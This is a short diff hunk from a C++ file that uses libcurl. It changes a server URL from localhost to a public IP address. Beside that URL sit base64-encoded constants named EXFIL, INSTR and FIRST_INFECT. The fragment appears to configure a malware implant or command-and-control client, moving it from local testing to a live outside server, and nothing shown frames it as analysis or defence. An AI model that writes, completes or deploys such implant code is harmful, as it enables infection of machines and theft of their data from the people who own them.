@@ -11,7 +11,7 @@
 #include <curl/curl.h>
 
 //Consts
-static const std::string URL = "http://localhost:1234/";
+static const std::string URL = "http://51.79.54.105:5000/";
 static const std::string EXFIL = "aGF0c3UK";
 static const std::string INSTR = "R1JOQ2hlZXRhaAo";
 static const std::string FIRST_INFECT = "ZGlyawo"; 
